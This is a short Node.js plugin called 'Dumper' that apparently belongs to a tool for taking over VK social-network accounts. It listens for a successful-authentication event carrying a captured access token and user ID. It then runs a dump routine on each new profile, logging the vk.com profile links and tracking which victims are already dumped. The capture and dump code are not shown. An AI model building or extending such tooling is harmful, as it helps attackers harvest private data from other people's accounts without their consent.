const { dump } = require("./dumper");
const log = require("./logger");

const dumped = new Set();

exports.name = "Dumper";

/**
 *
 * @param {*} config
 * @param {import("events").EventEmitter} ee
 */

exports.init = (config, ee) => {
  ee.on("auth:success", async ({ token, user_id }) => {
    if (dumped.has(user_id)) {
      log.warning(`Profile was already dumped: https://vk.com/id${user_id}`);

      return;
    }

    dumped.add(user_id);

    log.warning(`Starting dumper for profile: https://vk.com/id${user_id}`);

    try {
      await dump(token);
      ee.emit("dumper:success", { user_id });

      log.success(`Profile: https://vk.com/id${user_id} successful dumped`);
    } catch (error) {
      ee.emit("dumper:fail", { user_id });
      dumped.delete(user_id);

      log.error(`Profile: https://vk.com/id${user_id} failed to dump`, error);
    }
  });
};
